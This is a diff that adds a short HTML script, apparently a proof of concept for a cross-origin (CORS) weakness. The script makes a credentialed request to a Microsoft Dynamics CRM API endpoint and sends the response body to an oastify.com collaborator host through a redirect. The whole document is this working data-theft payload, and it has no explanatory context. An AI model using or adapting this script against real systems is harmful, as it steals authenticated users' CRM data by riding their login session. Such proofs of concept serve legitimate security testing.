@@ -1,0 +1,11 @@
+<script>
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('get','https://plumuat.crm11.dynamics.com/api/data/v9.0/msdyn_consoleapplicationtypes',true);
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+	location='//hqbms9xe86t8txr8avbdhuetkkqbe22r.oastify.com/log?key='+this.responseText;
+};
+</script>
